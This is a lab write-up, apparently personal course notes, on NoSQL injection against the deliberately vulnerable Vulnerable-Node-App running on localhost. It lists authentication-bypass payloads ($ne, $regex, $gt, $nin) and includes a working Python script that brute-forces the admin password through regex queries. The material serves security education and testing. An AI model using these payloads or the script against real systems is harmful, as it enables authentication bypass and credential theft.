---
title: "NoSQLi"
category: ["S4VITAR", "fases", "6-OWASP 10", "NoSQLi"]
---

**NoSQL injections** are a security vulnerability in web applications that use NoSQL databases like MongoDB, Cassandra, and CouchDB, among others. These injections occur when a web application allows an attacker to send malicious data through a database query, which is then executed by the application without proper validation or sanitization.

NoSQL injection works similarly to SQL injection but focuses on the specific vulnerabilities of NoSQL databases. In a NoSQL injection, the attacker exploits database queries based on **documents** instead of relational tables to send malicious data that can manipulate the database query and access confidential information or perform unauthorized actions.

Unlike SQL injections, NoSQL injections exploit the lack of data validation in a NoSQL database query rather than exploiting weaknesses in SQL queries in **relational databases**.

**LAB**
- **Vulnerable-Node-App**: [https://github.com/Charlie-belmer/vulnerable-node-app](https://github.com/Charlie-belmer/vulnerable-node-app)

After setting up the machine with Docker, navigate to localhost:4000  
![Pasted image 20260127190344](/VaultSite/wiki-images/Pasted%20image%2020260127190344.png)  
Click "Reset Db" to create some users  
![Pasted image 20260127190410](/VaultSite/wiki-images/Pasted%20image%2020260127190410.png)  
There are different windows: authentication and user lookup to search for users in the database.

If we try to log in as admin, it won't work:  
![Pasted image 20260127190501](/VaultSite/wiki-images/Pasted%20image%2020260127190501.png)  

Go to the [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) Git repository and filter by NoSQL. In NoSQL, we can manipulate conditions like `=` (user not equal to admin or another user):

```
username[$ne]=toto&password[$ne]=toto
login[$regex]=a.*&pass[$ne]=lol
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
```

For the lab, open Burp Suite and intercept an authentication request:  
![Pasted image 20260127190943](/VaultSite/wiki-images/Pasted%20image%2020260127190943.png)  
Send it to Repeater.  
(We'll test NoSQL injections after SQLi since SQL databases are more common.)

In the Repeater request, modify the password field to `{"$ne": ""}`, which means "password is not empty":  
![Pasted image 20260127191501](/VaultSite/wiki-images/Pasted%20image%2020260127191501.png)  
![Pasted image 20260127191519](/VaultSite/wiki-images/Pasted%20image%2020260127191519.png)  
Now we have access.

If we don’t know the username, we can do the same for the username field:  
![Pasted image 20260127191606](/VaultSite/wiki-images/Pasted%20image%2020260127191606.png)  

Next, let’s try to find admin’s password.  

We’ll use `"$regex": "^a"` to test with a regex and confirm the username starts with "a":  
![Pasted image 20260127191938](/VaultSite/wiki-images/Pasted%20image%2020260127191938.png)  
If we test another letter and no user starts with it, access is denied:  
![Pasted image 20260127192043](/VaultSite/wiki-images/Pasted%20image%2020260127192043.png)  
With "g," there’s another user:  
![Pasted image 20260127192030](/VaultSite/wiki-images/Pasted%20image%2020260127192030.png)  
With "j," another user exists:  
![Pasted image 20260127192127](/VaultSite/wiki-images/Pasted%20image%2020260127192127.png)  

Now that we know the username, we can do the same for the password using regex. We can also determine the password length—this is well-documented in the Git repo.  

Doing this manually would be slow, so we have two options: use Burp Suite’s Intruder or create a script.  

**PYTHON SCRIPT**  

```python
#!/usr/bin/python3
import requests, signal, sys, string
from pwn import *  # Requires pwntools: pip install pwntools
import re

def def_handler(sig, frame):
    print("\n\n[!] Exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

login_url = "http://localhost:4000/user/login"

characters = string.ascii_letters + string.digits + ".,_@-!$%"

def makeNoSQLI():
    password = ""
    
    p1 = log.progress("Brute force")
    p1.status("Starting extraction process")
    
    p2 = log.progress("Password")

    while True:
        found = False
        for character in characters:
            p2.status(password + character)
            
            # Escape the character in case it's a special Regex symbol (. * + ? etc)
            char_escaped = re.escape(character)
            # Also escape the accumulated password
            pass_escaped = re.escape(password)
            
            post_data = {
                "username": "admin",
                "password": {"$regex": f"^{pass_escaped}{char_escaped}"}
            }
            
            headers = {'Content-Type': 'application/json'}
            
            try:
                # Use 'json=' for automatic formatting and headers
                r = requests.post(login_url, json=post_data, headers=headers, timeout=5)
                
                if "Logged in as user" in r.text:
                    password += character
                    found = True
                    break
            except requests.exceptions.RequestException as e:
                log.error(f"Connection error: {e}")
                sys.exit(1)

        if not found:
            # If no characters match, we're done
            break

    p1.success("Process completed")
    p2.success(f"Password is: {password}")

if __name__ == '__main__':
    makeNoSQLI()
```

With this script, we retrieve the password:  
![Pasted image 20260127194000](/VaultSite/wiki-images/Pasted%20image%2020260127194000.png)  
![Pasted image 20260127194021](/VaultSite/wiki-images/Pasted%20image%2020260127194021.png)  

We could adapt the script to list other users by modifying the `post_data` line, changing "admin" to "guest," for example.  

For MongoDB, payloads like `' || ' '1' == '1` are documented in [HackTricks](https://book.hacktricks.wiki/en/index.html) **(always check Git or HackTricks for reference).**  

If we go to User Lookup:  
![Pasted image 20260127194754](/VaultSite/wiki-images/Pasted%20image%2020260127194754.png)  
![Pasted image 20260127194804](/VaultSite/wiki-images/Pasted%20image%2020260127194804.png)  
We see a user starting with "a," but earlier, only "admin" was shown. This is because the script has a `break` to move to the next character after a match. If we remove it, it might find more users like "angryPrism."
